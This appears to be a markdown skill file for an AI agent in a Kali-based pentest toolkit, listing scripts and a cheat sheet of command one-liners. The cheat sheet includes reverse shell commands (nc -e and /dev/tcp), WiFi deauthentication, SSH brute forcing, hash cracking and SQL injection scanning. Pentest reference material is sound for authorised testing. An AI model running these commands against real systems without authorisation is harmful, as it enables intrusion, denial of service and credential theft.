# Scripts Skill - Script Management & Creation

**Purpose:** Create, manage, and execute KaliShare scripts efficiently

## Script Categories

### Network Scripts
| Script | Purpose | Usage |
|--------|---------|-------|
| `net-scan` | Quick network scan | `./cli/net-scan 192.168.1.0/24` |
| `wifi-mon` | WiFi monitoring | `./cli/wifi-mon` |
| `kali-ctl` | Kali control | `./cli/kali-ctl start` |

### Installation Scripts
| Script | Purpose |
|--------|---------|
| `install-all-kali.sh` | Install all Kali tools |
| `install-ai-pentest-tools.sh` | AI pentest frameworks |
| `install-wifi-tools.sh` | WiFi auditing tools |
| `install-recon-tools.sh` | Reconnaissance tools |

### Boot & Recovery
| Script | Purpose |
|--------|---------|
| `boot-takeover-tools.sh` | Boot menu tools |
| `skeleton-key/create-usb.sh` | Create password reset USB |
| `smart-backup.sh` | Backup system |

### AI Tools
| Script | Purpose |
|--------|---------|
| `install-best-opencode-tools.sh` | OpenCode plugins |
| `install-gemini.sh` | Gemini CLI |
| `hexstrike-install.sh` | HexStrike AI |

## Quick Reference

```bash
# Run go command
./cli/go <command> [args]

# Common commands
./cli/go quick 192.168.1.1        # Quick scan
./cli/go wifi-menu                # WiFi tools
./cli/go pentest 10.0.0.1         # Full pentest
./cli/go home-lab                 # Setup home lab
./cli/go boot-menu                 # Boot tools
./cli/go win-reset                 # Windows reset
./cli/go validate                  # Check tools

# Run scripts directly
bash scripts/install-all-kali.sh
bash scripts/tool-widget.sh
```

## Script Structure Template

```bash
#!/bin/bash
# ====================================================================
# SCRIPT NAME - Purpose
# ====================================================================

set -euo pipefail
readonly SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

log() { echo -e "${GREEN}[*]${NC} $1"; }
warn() { echo -e "${YELLOW}[!]${NC} $1"; }
error() { echo -e "${RED}[X]${NC} $1"; exit 1; }

# Check root
[[ $EUID -ne 0 ]] && error "Run as root"

# Main
main() {
    log "Starting..."
    # Your code here
}

main "$@"
```

## Essential One-Liners

```bash
# Network
nmap -sn 192.168.1.0/24                    # Discover live hosts
nmap -sV -p- 192.168.1.1                   # Full port scan
masscan -p1-65535 10.0.0.1 --rate=10000    # Fast scan

# WiFi
airmon-ng start wlan0                      # Monitor mode
airodump-ng wlan0mon                       # Scan networks
aireplay-ng --deauth 100 -a BSSID wlan0mon # Deauth

# Web
nikto -h http://target                      # Vuln scan
sqlmap -u "http://target" --batch          # SQLi
gobuster dir -u http://target -w wordlist   # Directory

# Password
hashcat -m 0 hash.txt wordlist.txt          # MD5 crack
hydra -L users.txt -P pass.txt target ssh   # SSH brute

# Shell
nc -e /bin/bash 192.168.1.100 4444          # Reverse shell
bash -i >& /dev/tcp/ip/port 0>&1           # Bash reverse
```

## Troubleshooting

| Issue | Solution |
|-------|----------|
| Script not executable | `chmod +x script.sh` |
| Permission denied | Run with `sudo` |
| Tool not found | `which nmap` - check path |
| Script syntax error | `bash -n script.sh` |
| Variable empty | Add `set -u` and check |

## Related Skills

- [expert-pentester.md](./expert-pentester.md) - Pentest execution
- [redteam-guide.md](./redteam-guide.md) - Red team ops
- [ai-2026.md](./ai-2026.md) - AI integration